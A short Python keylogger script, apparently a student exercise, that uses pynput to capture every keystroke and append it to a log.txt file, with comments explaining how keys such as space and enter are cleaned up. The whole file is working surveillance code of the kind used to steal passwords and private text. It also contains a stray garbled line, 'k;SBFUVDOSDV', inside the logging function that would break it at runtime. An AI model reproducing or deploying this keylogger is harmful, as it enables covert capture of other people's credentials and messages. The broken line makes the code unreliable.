from pynput.keyboard import Listener #Pynput library is a library that enables us to control the input streams (like keyboard and mouse)


##WHILE THE PROGRAM IS RUNNING, THIS FUNCTION WILL SAVE THE DETECTED KEYS IN A FORMATTED, READABLE MANNER
def write_to_file(key):

    letter = str(key)
    letter = letter.replace("'", "")  #Taken each key pressed, like 'k' and converts it to k , cuts the Apostrophe so we can understand words

    if letter == 'Key.space':   #When Space is pressed we get " " instead of "Key.space", makes it easier to understand words
        letter = ' '
    if letter == 'Key.shift_r': #When Shift is pressed we get nothing instead of "Key.shift_r", makes it easier to understand words
        letter = ''
    if letter == "Key.ctrl_l":  #When Ctrl is pressed we get nothing instead of "Key.ctrl_l", makes it easier to understand words
        letter = ""
    if letter == "Key.enter":   #When Enter is pressed we move on to the next line instead of getting "Key.ctrl_l", makes it easier to read
        letter = "\n"

    ##WE CREATE A LOG.TXT FILE TO RECORD OUR PRESSED KEYS
    with open("log.txt", 'a') as f:
        f.write(letter)#this is coded by a gazi university student
        k;SBFUVDOSDV


##WHILE THE PROGRAM IS RUNNING, THIS FUNCTION WILL DETECT KEYBOARD ACTIONS
with Listener(on_press=write_to_file) as l: #Detects the key that was pressed and returns it to the write_to_function to save it.
    l.join()